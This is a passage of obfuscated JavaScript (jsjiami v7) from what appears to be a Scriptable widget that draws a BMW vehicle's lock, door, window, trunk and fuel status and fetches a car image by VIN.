_0x301383=[],_0x106812=0x0,_0x15091f,_0x51ec7e='';_0x17a1f6=_0x4b0687(_0x17a1f6);let _0x16bb3f;for(_0x16bb3f=0x0;_0x16bb3f<0x100;_0x16bb3f++){_0x301383[_0x16bb3f]=_0x16bb3f;}for(_0x16bb3f=0x0;_0x16bb3f<0x100;_0x16bb3f++){_0x106812=(_0x106812+_0x301383[_0x16bb3f]+_0x866dd2['charCodeAt'](_0x16bb3f%_0x866dd2['length']))%0x100,_0x15091f=_0x301383[_0x16bb3f],_0x301383[_0x16bb3f]=_0x301383[_0x106812],_0x301383[_0x106812]=_0x15091f;}_0x16bb3f=0x0,_0x106812=0x0;for(let _0xece919=0x0;_0xece919<_0x17a1f6['length'];_0xece919++){_0x16bb3f=(_0x16bb3f+0x1)%0x100,_0x106812=(_0x106812+_0x301383[_0x16bb3f])%0x100,_0x15091f=_0x301383[_0x16bb3f],_0x301383[_0x16bb3f]=_0x301383[_0x106812],_0x301383[_0x106812]=_0x15091f,_0x51ec7e+=String['fromCharCode'](_0x17a1f6['charCodeAt'](_0xece919)^_0x301383[(_0x301383[_0x16bb3f]+_0x301383[_0x106812])%0x100]);}return _0x51ec7e;};_0x1261['BMZryL']=_0x58c122,_0x2c2d40=arguments,_0x1261['TmLjUb']=!![];}const _0x1d1299=_0x113dc0[0x0],_0x71c99f=_0x1261c4+_0x1d1299,_0x285aad=_0x2c2d40[_0x71c99f];return!_0x285aad?(_0x1261['tNuWMl']===undefined&&(_0x1261['tNuWMl']=!![]),_0xe90863=_0x1261['BMZryL'](_0xe90863,_0x2f0b64),_0x2c2d40[_0x71c99f]=_0xe90863):_0xe90863=_0x285aad,_0xe90863;},_0x1261(_0x2c2d40,_0x3ad289);}canvas['setStrokeColor'](new Color('#ff7f00',0.6));let image=null;data['state'][_0x12a7f1(0xa5,'#kfs')][_0x12a7f1(0xa2,'Hm11')]==='SECURED'?image=await this[_0x12a7f1(0xda,'M7xz')]('Lock0.png'):image=await this[_0x12a7f1(0xa6,'JxEB')]('Lock1.png');canvas['setFillColor'](new Color('#000',0.3)),canvas[_0x12a7f1(0xc8,'NIK7')](new Rect(leftOffest,heightOffest,0x19,0x19)),canvas[_0x12a7f1(0xcf,'T8^!')](image,new Rect(leftOffest,heightOffest,0x19,0x19)),canvas[_0x12a7f1(0xcd,'u!&z')](new Rect(leftOffest,heightOffest,0x19,0x19)),image=null;let doorstateNum=await this[_0x12a7f1(0xc5,'Y5pB')](data['state'][_0x12a7f1(0xe9,'Ygeg')]);image=await this['getUserImge'](_0x12a7f1(0xbe,'8k*M')+doorstateNum+'.png'),canvas[_0x12a7f1(0xb4,'[C9C')](new Rect(leftOffest+0x28,heightOffest,0x19,0x19)),canvas[_0x12a7f1(0xc3,'mQ%P')](image,new Rect(leftOffest+0x28,heightOffest,0x19,0x19)),canvas['strokeRect'](new Rect(leftOffest+0x28,heightOffest,0x19,0x19)),image=null;data[_0x12a7f1(0xe1,'VzZK')][_0x12a7f1(0xa4,'8k*M')]['combinedState']===_0x12a7f1(0xe3,'K[p8')?image=await this[_0x12a7f1(0xd7,'D(7D')](_0x12a7f1(0xec,'aAz0')):image=await this['getUserImge']('Win1.png');canvas['fillRect'](new Rect(leftOffest+0x50,heightOffest,0x19,0x19)),canvas['drawImageInRect'](image,new Rect(leftOffest+0x50,heightOffest,0x19,0x19)),canvas[_0x12a7f1(0xb0,'%Y&s')](new Rect(leftOffest+0x50,heightOffest,0x19,0x19)),image=null;data[_0x12a7f1(0xc4,'^EPc')][_0x12a7f1(0xc0,'3Juq')][_0x12a7f1(0xca,'JxEB')]===_0x12a7f1(0xb2,'%Y&s')?image=await this[_0x12a7f1(0xa3,'uRnZ')](_0x12a7f1(0xcb,'NvX]')):image=await this['getUserImge'](_0x12a7f1(0xc6,'cN^y'));canvas[_0x12a7f1(0xea,'Y5pB')](new Rect(leftOffest,heightOffest+0x1e,0x19,0x19)),canvas[_0x12a7f1(0xd5,'NvX]')](image,new Rect(leftOffest,heightOffest+0x1e,0x19,0x19)),canvas['strokeRect'](new Rect(leftOffest,heightOffest+0x1e,0x19,0x19)),image=null;data[_0x12a7f1(0xcc,'#kfs')][_0x12a7f1(0xd9,'oi]8')]['trunk']==='CLOSED'?image=await this[_0x12a7f1(0xdb,'VzZK')]('Trunk0.png'):image=await this['getUserImge']('Trunk1.png');canvas['fillRect'](new Rect(leftOffest+0x28,heightOffest+0x1e,0x19,0x19)),canvas[_0x12a7f1(0xaa,'s3&V')](image,new Rect(leftOffest+0x28,heightOffest+0x1e,0x19,0x19)),canvas[_0x12a7f1(0xbf,'sj2u')](new Rect(leftOffest+0x28,heightOffest+0x1e,0x19,0x19)),image=null;data[_0x12a7f1(0xc4,'^EPc')]['roofState']['roofState']===_0x12a7f1(0xe0,'OwH]')?image=await this[_0x12a7f1(0xa3,'uRnZ')](_0x12a7f1(0xb6,'iWs6')):image=await this['getUserImge'](_0x12a7f1(0xe7,'8k*M'));canvas[_0x12a7f1(0xdf,'fCNL')](new Rect(leftOffest+0x50,heightOffest+0x1e,0x19,0x19)),canvas[_0x12a7f1(0xa9,'QUH#')](image,new Rect(leftOffest+0x50,heightOffest+0x1e,0x19,0x19)),canvas[_0x12a7f1(0xc2,'JxEB')](new Rect(leftOffest+0x50,heightOffest+0x1e,0x19,0x19));let carImage=await this['getBMWImage'](data,_0x12a7f1(0xb3,'aAz0'));;let imageSize=this[_0x12a7f1(0xd3,'cz0f')](carImage[_0x12a7f1(0xa1,'EKjg')][_0x12a7f1(0xd4,'EKjg')],carImage['size'][_0x12a7f1(0xd8,'oi]8')],canvasWidth,canvasHeight,resizeRate);console[_0x12a7f1(0xc1,'851w')](_0x12a7f1(0xe4,'D(7D')+imageSize[_0x12a7f1(0xe8,'M7xz')]/ imageSize['height']),console[_0x12a7f1(0xe2,'NIK7')]('imageSize\x20'+JSON[_0x12a7f1(0xe6,'oi]8')](imageSize)),canvas[_0x12a7f1(0xa8,'E]jM')](carImage,new Rect(Math[_0x12a7f1(0xdd,'VzZK')]((canvasWidth-imageSize[_0x12a7f1(0xb5,'dl36')])/0x2),0x0,imageSize[_0x12a7f1(0xce,'ErOx')],imageSize[_0x12a7f1(0xc9,'fCNL')]));return canvas[_0x12a7f1(0xbc,'F^47')]();var version_ = 'jsjiami.com.v7';
  }
  getMasterCanvasImage=async function(data, canvasWidth, canvasHeight, resizeRate) {
    var version_='jsjiami.com.v7';const _0x42ea7d=_0x3b0a;(function(_0x2c9ccf,_0x533841,_0x4d4a5c,_0x25208a,_0x584efa,_0x2826b9,_0x5ccffa){return _0x2c9ccf=_0x2c9ccf>>0x3,_0x2826b9='hs',_0x5ccffa='hs',function(_0xa9ea24,_0x136298,_0x3d725e,_0x48e12c,_0x387cba){const _0x29c046=_0x3b0a;_0x48e12c='tfi',_0x2826b9=_0x48e12c+_0x2826b9,_0x387cba='up',_0x5ccffa+=_0x387cba,_0x2826b9=_0x3d725e(_0x2826b9),_0x5ccffa=_0x3d725e(_0x5ccffa),_0x3d725e=0x0;const _0x3475a0=_0xa9ea24();while(!![]&&--_0x25208a+_0x136298){try{_0x48e12c=-parseInt(_0x29c046(0x94,'jjtQ'))/0x1+-parseInt(_0x29c046(0x67,'Wsg7'))/0x2+parseInt(_0x29c046(0x90,'YXQ3'))/0x3*(parseInt(_0x29c046(0x74,'7[d('))/0x4)+parseInt(_0x29c046(0x8a,'N*aG'))/0x5+parseInt(_0x29c046(0x7f,'t2ys'))/0x6+-parseInt(_0x29c046(0xb9,'fxMs'))/0x7+parseInt(_0x29c046(0x81,'8Bzq'))/0x8*(parseInt(_0x29c046(0x7a,'QIXz'))/0x9);}catch(_0x21d887){_0x48e12c=_0x3d725e;}finally{_0x387cba=_0x3475a0[_0x2826b9]();if(_0x2c9ccf<=_0x25208a)_0x3d725e?_0x584efa?_0x48e12c=_0x387cba:_0x584efa=_0x387cba:_0x3d725e=_0x387cba;else{if(_0x3d725e==_0x584efa['replace'](/[JQBuHtFqKEWXOTLyxM=]/g,'')){if(_0x48e12c===_0x136298){_0x3475a0['un'+_0x2826b9](_0x387cba);break;}_0x3475a0[_0x5ccffa](_0x387cba);}}}}}(_0x4d4a5c,_0x533841,function(_0x3c35fb,_0x566270,_0x159f0f,_0x11444b,_0x464360,_0xdc693f,_0xbf645f){return _0x566270='\x73\x70\x6c\x69\x74',_0x3c35fb=arguments[0x0],_0x3c35fb=_0x3c35fb[_0x566270](''),_0x159f0f='\x72\x65\x76\x65\x72\x73\x65',_0x3c35fb=_0x3c35fb[_0x159f0f]('\x76'),_0x11444b='\x6a\x6f\x69\x6e',(0x1298c1,_0x3c35fb[_0x11444b](''));});}(0x5e8,0x47d16,_0x3bce,0xbf),_0x3bce)&&(version_=_0x3bce);if(!this[_0x42ea7d(0xb4,'TbGz')][_0x42ea7d(0x91,'U%ms')])try{let carImage=await this[_0x42ea7d(0xb7,'7[d(')](data);return carImage;}catch(_0x25c876){console[_0x42ea7d(0xb0,'Pts1')](_0x25c876);}let canvas=new DrawContext();canvas[_0x42ea7d(0x8d,'&L%E')]=new Size(canvasWidth,canvasHeight),canvas['opaque']=![];let src='',loffest=0x52;canvas[_0x42ea7d(0x8c,'U%ms')](this[_0x42ea7d(0xa5,'V5pE')]()),canvas[_0x42ea7d(0x77,'#tWa')]=!![];let offh1=0x0;try{canvas['setFillColor'](new Color(_0x42ea7d(0x70,'QaNk'),0.2)),canvas['fillRect'](new Rect(Math[_0x42ea7d(0x9b,'CjR0')]((canvasWidth-0x78)/0x2),0x4f,0x78,0x1)),canvas[_0x42ea7d(0xaa,'S1Kr')](new Color(_0x42ea7d(0x7e,'MkNL'),0.9)),canvas['fillRect'](new Rect(Math[_0x42ea7d(0x87,'%^r[')]((canvasWidth-0x78)/0x2),0x4f,Math['round'](parseInt(data[_0x42ea7d(0xad,'X4ix')][_0x42ea7d(0xa3,'hl[K')]['remainingFuelPercent'])/0x64*0x78),0x5)),canvas[_0x42ea7d(0x78,'y]Rr')](this['getFont'](WIDGET_FONT_BOLD,Math[_0x42ea7d(0x86,'t2ys')](0xa))),canvas[_0x42ea7d(0x9f,'Pts1')]('油位',new Rect(Math[_0x42ea7d(0xae,'QIXz')]((canvasWidth-0x78)/0x2)+0xc,0x55,Math[_0x42ea7d(0xa9,'leQ8')](canvasWidth*0.5),Math[_0x42ea7d(0xbf,')zMA')](canvasWidth*0.3))),canvas[_0x42ea7d(0x97,'q)2T')](this[_0x42ea7d(0xac,'7[d(')](WIDGET_FONT_BOLD,Math[_0x42ea7d(0xa2,'h%28')](0xb))),src=JSON['stringify'](data[_0x42ea7d(0x83,'L$TV')]['combustionFuelLevel'][_0x42ea7d(0xb8,'rBU9')]),canvas['drawTextInRect'](src,new Rect(loffest,0x55,Math[_0x42ea7d(0xb2,'&L%E')](canvasWidth*0.5),Math[_0x42ea7d(0xbe,'QaNk')](canvasWidth*0.3))),src=JSON[_0x42ea7d(0x66,')zMA')](data['state'][_0x42ea7d(0x8b,'Ct)y')][_0x42ea7d(0x73,'%^r[')]),canvas[_0x42ea7d(0x6c,'fw7z')](src,new Rect(loffest+0x1e,0x55,Math['round'](canvasWidth*0.5),Math[_0x42ea7d(0x7d,'S1Kr')](canvasWidth*0.3))),canvas[_0x42ea7d(0xaf,'8Bzq')](this[_0x42ea7d(0x7c,'%^r[')](WIDGET_FONT_BOLD,Math['round'](0x8))),canvas[_0x42ea7d(0x65,'jjtQ')]('%',new Rect(loffest+0xf,0x58,Math[_0x42ea7d(0xa1,'fxMs')](canvasWidth*0.5),Math[_0x42ea7d(0xbc,'w1v*')](canvasWidth*0.3))),canvas[_0x42ea7d(0x68,'q)2T')]('/',new Rect(loffest+0x1a,0x57,Math[_0x42ea7d(0xbd,'Z0^@')](canvasWidth*0.5),Math[_0x42ea7d(0xbe,'QaNk')](canvasWidth*0.3))),canvas['drawTextInRect']('km',new Rect(loffest+0x34,0x58,Math[_0x42ea7d(0xa4,'[a%Q')](canvasWidth*0.5),Math['round'](canvasWidth*0.3)));let image=await this[_0x42ea7d(0xc1,'n2Vj')](_0x42ea7d(0x9c,'[a%Q'));canvas[_0x42ea7d(0x72,'n2Vj')](image,new Rect(Math[_0x42ea7d(0x92,'nIWe')]((canvasWidth-0x78)/0x2)-0x2,0x56,0xc,0xc)),canvas['setFont'](this[_0x42ea7d(0x85,'TbGz')](WIDGET_FONT_BOLD,Math[_0x42ea7d(0x8f,'vJwH')](0x14)));let checkControlMessages=this[_0x42ea7d(0x69,'U%ms')](data);if(checkControlMessages&&checkControlMessages[_0x42ea7d(0xa7,'[a%Q')]==0x0)canvas[_0x42ea7d(0x65,'jjtQ')](_0x42ea7d(0xc0,'%^r['),new Rect(Math[_0x42ea7d(0xbf,')zMA')](canvasWidth*0.05),-0x5,Math[_0x42ea7d(0x95,'MkNL')](canvasWidth*0.5),Math[_0x42ea7d(0x6a,'X%zC')](canvasWidth*0.5))),canvas['drawTextInRect'](_0x42ea7d(0xbb,'xM5@'),new Rect(Math['round'](canvasWidth*0.05),0xf,Math[_0x42ea7d(0x8e,'l2WS')](canvasWidth*0.7),Math['round'](canvasWidth*0.5)));else{let messageFontSize=Math['round'](canvasHeight/0x9),messageOffset=Math[_0x42ea7d(0x93,'R2wW')](messageFontSize*1.5)+offh1,exclamation=SFSymbol[_0x42ea7d(0xa8,'vJwH')]('exclamationmark.circle')[_0x42ea7d(0x6f,'fxMs')];canvas[_0x42ea7d(0xa6,'J4cY')](exclamation,new Rect(0x0,messageOffset,Math['round'](messageFontSize*1.2),Math['round'](messageFontSize*1.2))),canvas['setFont'](this['getFont'](WIDGET_FONT,messageFontSize)),canvas['setTextColor'](this[_0x42ea7d(0x84,'N*aG')]());for(const checkControlMessage of checkControlMessages){canvas[_0x42ea7d(0x6b,'U%ms')](checkControlMessage[_0x42ea7d(0xb5,'X4ix')],new Rect(Math[_0x42ea7d(0x93,'R2wW')](messageFontSize*1.5),messageOffset,Math[_0x42ea7d(0x82,'y]Rr')](canvasWidth*0.5),Math['round'](canvasWidth*0.5))),messageOffset=messageOffset+messageFontSize;}}}catch(_0x5d6d1e){console['warn'](_0x5d6d1e[_0x42ea7d(0xc3,'Wsg7')]);}let carImage=await this[_0x42ea7d(0x9d,'h%28')](data),imageSize=this[_0x42ea7d(0x9e,'8Bzq')](carImage[_0x42ea7d(0x71,'vJwH')][_0x42ea7d(0x7b,'mmFu')],carImage['size'][_0x42ea7d(0x88,'%^r[')],canvasWidth,canvasHeight,resizeRate);console[_0x42ea7d(0x9a,'Ct)y')](_0x42ea7d(0xba,'mmFu')+imageSize[_0x42ea7d(0x99,'fw7z')]/ imageSize[_0x42ea7d(0x6e,'L$TV')]),console[_0x42ea7d(0x98,'l2WS')]('imageSize\x20'+JSON[_0x42ea7d(0x80,'nIWe')](imageSize)),canvas[_0x42ea7d(0x6d,'c4Ab')](carImage,new Rect(Math[_0x42ea7d(0xc2,'A][6')]((canvasWidth-imageSize[_0x42ea7d(0x79,'MkNL')])/0x2),0x11,imageSize[_0x42ea7d(0xb1,'S1Kr')],imageSize[_0x42ea7d(0xb6,'t2ys')]));function _0x3b0a(_0x3d570b,_0x4b06e1){const _0x3bce63=_0x3bce();return _0x3b0a=function(_0x3b0aac,_0x4de6ef){_0x3b0aac=_0x3b0aac-0x65;let _0x53331d=_0x3bce63[_0x3b0aac];if(_0x3b0a['KhBHkI']===undefined){var _0x554568=function(_0x48f84f){const _0x44b398='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x58a3d7='',_0x2a63c1='';for(let _0x2b2845=0x0,_0x7527eb,_0x2ad47b,_0x43a9ae=0x0;_0x2ad47b=_0x48f84f['charAt'](_0x43a9ae++);~_0x2ad47b&&(_0x7527eb=_0x2b2845%0x4?_0x7527eb*0x40+_0x2ad47b:_0x2ad47b,_0x2b2845++%0x4)?_0x58a3d7+=String['fromCharCode'](0xff&_0x7527eb>>(-0x2*_0x2b2845&0x6)):0x0){_0x2ad47b=_0x44b398['indexOf'](_0x2ad47b);}for(let _0x6f29d5=0x0,_0x2bd572=_0x58a3d7['length'];_0x6f29d5<_0x2bd572;_0x6f29d5++){_0x2a63c1+='%'+('00'+_0x58a3d7['charCodeAt'](_0x6f29d5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2a63c1);};const _0x17b065=function(_0x441b8a,_0x376c21){let _0xd29bde=[],_0x52c5eb=0x0,_0x40f0a3,_0x285ef2='';_0x441b8a=_0x554568(_0x441b8a);let _0x5ce94d;for(_0x5ce94d=0x0;_0x5ce94d<0x100;_0x5ce94d++){_0xd29bde[_0x5ce94d]=_0x5ce94d;}for(_0x5ce94d=0x0;_0x5ce94d<0x100;_0x5ce94d++){_0x52c5eb=(_0x52c5eb+_0xd29bde[_0x5ce94d]+_0x376c21['charCodeAt'](_0x5ce94d%_0x376c21['length']))%0x100,_0x40f0a3=_0xd29bde[_0x5ce94d],_0xd29bde[_0x5ce94d]=_0xd29bde[_0x52c5eb],_0xd29bde[_0x52c5eb]=_0x40f0a3;}_0x5ce94d=0x0,_0x52c5eb=0x0;for(let _0x6fcb50=0x0;_0x6fcb50<_0x441b8a['length'];_0x6fcb50++){_0x5ce94d=(_0x5ce94d+0x1)%0x100,_0x52c5eb=(_0x52c5eb+_0xd29bde[_0x5ce94d])%0x100,_0x40f0a3=_0xd29bde[_0x5ce94d],_0xd29bde[_0x5ce94d]=_0xd29bde[_0x52c5eb],_0xd29bde[_0x52c5eb]=_0x40f0a3,_0x285ef2+=String['fromCharCode'](_0x441b8a['charCodeAt'](_0x6fcb50)^_0xd29bde[(_0xd29bde[_0x5ce94d]+_0xd29bde[_0x52c5eb])%0x100]);}return _0x285ef2;};_0x3b0a['rYxpbV']=_0x17b065,_0x3d570b=arguments,_0x3b0a['KhBHkI']=!![];}const _0x4116bb=_0x3bce63[0x0],_0x578347=_0x3b0aac+_0x4116bb,_0x120eb6=_0x3d570b[_0x578347];return!_0x120eb6?(_0x3b0a['SBwtVq']===undefined&&(_0x3b0a['SBwtVq']=!![]),_0x53331d=_0x3b0a['rYxpbV'](_0x53331d,_0x4de6ef),_0x3d570b[_0x578347]=_0x53331d):_0x53331d=_0x120eb6,_0x53331d;},_0x3b0a(_0x3d570b,_0x4b06e1);}return canvas['getImage']();function _0x3bce(){const _0x37374f=(function(){return[version_,'TjWEsujBiaKFmiQ.OcJoyym.LQvqO7XMFBxHtytM==','fCkDj31A','uexcOCk+Fx12','hGC7WRVcNdO0w3hcOSkTW5hcH8o3','dw11W6T6fmohuSo2','dbddQ8o1kY56wmkfWQVcICoY','BuLwWQqEBfhdKmo8W4VcRCkRbrm','pSoRh8oqmhdcSahdKaJcObhcLCk5WQpdUGeN','WQKzmmouW7K','pCo8cSoKc3VcVaFdTGRcVXhcHCk+','W6VdOh4PWPZdIGnyyKpdKSk/e08','W4H4cSojuCkPv8kJs8krBmkcW6/dMuu','WR4fyvTCW4S','hajArZ0','WPNdGSk7rG','gYOarq','W5hdGSo4WRGaWOKfWQldRmktWPT3ASkrW7e','W7BcTHpdL8o4','WRSCxCoPp8ohWRv3WQK','W4jKWQOWsvmqW7RcHmo+WR0+','W7mPW6VdPM/dPSo6W588smoV','WRr+WQZcOtpdTSoyW7q2s8oVW5xcNSoqudBdNLG','p8kDpaffcti','WQVcISowcH4','oxnNWRmFyHXKdmkOvW','W63dQSotW4ix','W6pcSGNdTSoYWQBcNa','W5tdMSk2WPX5','W7/cHCousrddLxu','y8kqW7WUzIjPaCk4WO/dTSkq','W5DUySkECmoxW4jTWQa','fSk8WRBcJI4KjH9P'].concat((function(){return['pSkxpsLo','WQuuAuHr','EmkinSoeW4JcRbiZsmkMeCoq','WPCpb8oasYdcHq','jmokWRP4oW','W7BcUaJdNSo5','W6ZcSHtdL8o1WRW','W67dKCkkfaFcIIrZCa','lSoCCmk1WPldU1mXySkdf8oaWRa','fIr7bfdcPWG1DCoCyGmbD8ozmCoDW7eT','kSoRh8ohoMBcSdddKaJcGGy','WRVcT2pdQq','nSojWQxdG8o8','gIWptSoo','yYBdRH1LW57cUCkFusrP','kSoMbmoKah3cQX3dIXBcGHJcUCkPWQRdUaC/WRq','W5z1zCkzEG','qxPaWQ15','s0XQW7NdUM8nAMlcV8k+W5C','WQ7cJmohebi','lmoBDCk2WPldSLuyvCkodmo2WQu','EL5dWPuLz10','m8ohWQldGW','W7JdU3SQWQa','aIPKca','WQtdJbVcN8oT','esBcLSo3qmk9kL0','WP/dOSowW5KqiHFdGSk7WOFcU8oUWPNcICk4','rCoVW7BcJIadaJrJWQNdM1u','W6BcJwZcVbpcRCoQzflcQSoIW4pdJui','WOeKFZNcKKyWW7n1rmkdWRq','bWbotJW','WORdQmoxW6er'].concat((function(){return['WPpdVSomW5BcPSkchCoWW44CWPBcRCouWRbjpSoNEuC','btZcHSo1cG','WO9PCrJcGJuMtJddR8kfEG','WRldIMRdGmoJwCoTnHBcMxydWO3cQCoB','gZBcNCo8gSkL','bIixrCoo','WQhdTSkbhrK','W5xdKmk3WRr0W5FcISk6gxK9WO0','oaSoW6T9puddTCoCW7tcQ8kj','W65leCofiCogWQa','W5xcQmoEn8kY','FI4MW6Pc','uCoVW7BcGsimeq','W7xcNN/cPq','W5hdNmkNWOz1','WRRcSwZdOSkf','sI8ZW4T3nCoTESow','WOuzfSo0zYhcN8kvW6FcJ8oFW6VcOxi','W4JcVCosjG','pSoaWQzXn2a','W65leCovk8oaWR1mWPuCWOZdRmkbvSkj','WQXhD8ktW4z5fmoBAs0Gmr3dJ8oBWRtcUwpdSKW','rLKmfg3dQCouWPiFWO4KWPHt','W6JdOSodW5nF','WRqsW5vb','q8kDaKK2','uNdcTgj8','W4JcNCo+gfm','dhzYW6XW','W4xcMZe','W5ldLCoTWPO6WOewWOZdPmk9WPa'];}()));}()));}());_0x3bce=function(){return _0x37374f;};return _0x3bce();};var version_ = 'jsjiami.com.v7';
  }
  getBMWImage= async function(data, mode ,useCache = true) {
    var version_='jsjiami.com.v7';const _0x21d919=_0x3cc3;function _0x420f(){const _0x266811=(function(){return[version_,'MTwjPsLWjfuiabUmBLOixB.cleobrPmFn.VRvTh7==','W4HLbX3cOsFcHGTbW6JcO8otkq','W61vW7iIre/dLq','WPVcI8kIhmoQi1K','yvbmCSkN','WQ0gW5iqWOJcH8kor0ddQt8NWPbmWOPc','sCkwpSogW6ZdHxSkn01Mzq','kq5scCoyCvZdNH7cO8kjlG','W6C0wfxcMIWbWRKHidNdOSkN','mwvGWO7dS8o9taq','W5JcQSk0BCoFe8oVxexdK8k7W67cTSopWO/cIq','WR7cNb9ZW4eTyJHvWOb/W5pdKmoZ'].concat((function(){return['vbTFW43cSt9vagGon8oPWOK','deahWPxdMw8tiq','W4pcT8k8FCo+p8oKxfFdMG','W5ldGSoCjSk0jcC6WRNdLCklWQddMmoY','kCoWW5pcPSopWP7cOCoLW4GAW53cJ0u','tGhdJSoyomk9W6tcTSkNWOaSWRBdU8kzWPZcMCkkWOS','EHjYW7/dQSkMtGK','EahdGSoAmSk9WQu','5RkN5PYqhSkEWOtcVCoI','BZ5LWQpdMW','WR7cMeOlWRnMa3O','DmoyW4X/bdvEk0y2W5Tch8ojW5ZcQsJcG8kGWQtdT0BcT8oYWQGIBbPXoCoT','cCkIW5fWzWdcUvPeW67dIX4K'].concat((function(){return['WPu/uexdTa','W5xcQ8kXE8o0h8oTfuhdJ8o+W4BdTCkFW5hdNmk3oSo/nmogpmkIWQZcUaRdI3ddJgmHWPZcKmoEnXxcNL/dKXFcJSocaCkjWRhdP0FcV8kaW4RdMZddPrWJnrxdJa','fujD','WQnbjSkBW4XPdsmHWR0TeZ/cN8omW6ZdHSkqkfVcKwFcG8ouaCk9WR8NW75xvJW8idddPmkN','W7JcUSkopSkL','WQhcV8kEamok','W4THeW','hCoMcSoom8odW4TurCk1ESkb','cZ5jx8oBW6PMW6ulWRxdMSomWOa','nSocjmowdmoGpCo4W7pcM8ktWQu'];}()));}()));}());_0x420f=function(){return _0x266811;};return _0x420f();};(function(_0x49e3da,_0x4f4a62,_0x2e8b94,_0x1a0f4b,_0x5fd302,_0x27850e,_0x2438b6){return _0x49e3da=_0x49e3da>>0x5,_0x27850e='hs',_0x2438b6='hs',function(_0x6d3067,_0x601e6,_0x5e3dd9,_0x18e7e0,_0x22795e){const _0x2d6432=_0x3cc3;_0x18e7e0='tfi',_0x27850e=_0x18e7e0+_0x27850e,_0x22795e='up',_0x2438b6+=_0x22795e,_0x27850e=_0x5e3dd9(_0x27850e),_0x2438b6=_0x5e3dd9(_0x2438b6),_0x5e3dd9=0x0;const _0x4d5208=_0x6d3067();while(!![]&&--_0x1a0f4b+_0x601e6){try{_0x18e7e0=-parseInt(_0x2d6432(0xf5,'FlWR'))/0x1+parseInt(_0x2d6432(0xfc,'L7pB'))/0x2+-parseInt(_0x2d6432(0xfd,'CTYG'))/0x3+-parseInt(_0x2d6432(0x101,'Z[VB'))/0x4*(-parseInt(_0x2d6432(0xf7,'Pe[v'))/0x5)+parseInt(_0x2d6432(0xf6,'4Pn6'))/0x6+parseInt(_0x2d6432(0xeb,'^oVk'))/0x7*(-parseInt(_0x2d6432(0xe9,'32*N'))/0x8)+parseInt(_0x2d6432(0xe2,'!wU^'))/0x9;}catch(_0x3ac957){_0x18e7e0=_0x5e3dd9;}finally{_0x22795e=_0x4d5208[_0x27850e]();if(_0x49e3da<=_0x1a0f4b)_0x5e3dd9?_0x5fd302?_0x18e7e0=_0x22795e:_0x5fd302=_0x22795e:_0x5e3dd9=_0x22795e;else{if(_0x5e3dd9==_0x5fd302['replace'](/[wlFWPTxORnhMbfVuUBreL=]/g,'')){if(_0x18e7e0===_0x601e6){_0x4d5208['un'+_0x27850e](_0x22795e);break;}_0x4d5208[_0x2438b6](_0x22795e);}}}}}(_0x2e8b94,_0x4f4a62,function(_0x3d62e0,_0x2eb620,_0x61ae60,_0x16152d,_0x3f7a5f,_0x5012aa,_0x20d2be){return _0x2eb620='\x73\x70\x6c\x69\x74',_0x3d62e0=arguments[0x0],_0x3d62e0=_0x3d62e0[_0x2eb620](''),_0x61ae60='\x72\x65\x76\x65\x72\x73\x65',_0x3d62e0=_0x3d62e0[_0x61ae60]('\x76'),_0x16152d='\x6a\x6f\x69\x6e',(0x1298b2,_0x3d62e0[_0x16152d](''));});}(0x17e0,0xb57f5,_0x420f,0xc1),_0x420f)&&(version_=_0x420f);let url=BMW_SERVER_HOST+_0x21d919(0xef,'XY^v')+data['vin']+_0x21d919(0xfa,'EE8w')+mode;function _0x3cc3(_0x5e37c9,_0x4f871a){const _0x420f2a=_0x420f();return _0x3cc3=function(_0x3cc3e3,_0x18098c){_0x3cc3e3=_0x3cc3e3-0xe0;let _0x14ede7=_0x420f2a[_0x3cc3e3];if(_0x3cc3['bfpGgm']===undefined){var _0x29b023=function(_0x3d8ed0){const _0x594ada='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2ac57e='',_0x12569e='';for(let _0x28e136=0x0,_0x7363a,_0x16c228,_0x427b98=0x0;_0x16c228=_0x3d8ed0['charAt'](_0x427b98++);~_0x16c228&&(_0x7363a=_0x28e136%0x4?_0x7363a*0x40+_0x16c228:_0x16c228,_0x28e136++%0x4)?_0x2ac57e+=String['fromCharCode'](0xff&_0x7363a>>(-0x2*_0x28e136&0x6)):0x0){_0x16c228=_0x594ada['indexOf'](_0x16c228);}for(let _0x296abb=0x0,_0xff6d18=_0x2ac57e['length'];_0x296abb<_0xff6d18;_0x296abb++){_0x12569e+='%'+('00'+_0x2ac57e['charCodeAt'](_0x296abb)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x12569e);};const _0x37d70f=function(_0x11688a,_0x28cf27){let _0x5e6622=[],_0x503cf5=0x0,_0x32b90e,_0x321b97='';_0x11688a=_0x29b023(_0x11688a);let _0x3b7ef3;for(_0x3b7ef3=0x0;_0x3b7ef3<0x100;_0x3b7ef3++){_0x5e6622[_0x3b7ef3]=_0x3b7ef3;}for(_0x3b7ef3=0x0;_0x3b7ef3<0x100;_0x3b7ef3++){_0x503cf5=(_0x503cf5+_0x5e6622[_0x3b7ef3]+_0x28cf27['charCodeAt'](_0x3b7ef3%_0x28cf27['length']))%0x100,_0x32b90e=_0x5e6622[_0x3b7ef3],_0x5e6622[_0x3b7ef3]=_0x5e6622[_0x503cf5],_0x5e6622[_0x503cf5]=_0x32b90e;}_0x3b7ef3=0x0,_0x503cf5=0x0;for(let _0x442e64=0x0;_0x442e64<_0x11688a['length'];_0x442e64++){_0x3b7ef3=(_0x3b7ef3+0x1)%0x100,_0x503cf5=(_0x503cf5+_0x5e6622[_0x3b7ef3])%0x100,_0x32b90e=_0x5e6622[_0x3b7ef3],_0x5e6622[_0x3b7ef3]=_0x5e6622[_0x503cf5],_0x5e6622[_0x503cf5]=_0x32b90e,_0x321b97+=String['fromCharCode'](_0x11688a['charCodeAt'](_0x442e64)^_0x5e6622[(_0x5e6622[_0x3b7ef3]+_0x5e6622[_0x503cf5])%0x100]);}return _0x321b97;};_0x3cc3['AhxZMG']=_0x37d70f,_0x5e37c9=arguments,_0x3cc3['bfpGgm']=!![];}const 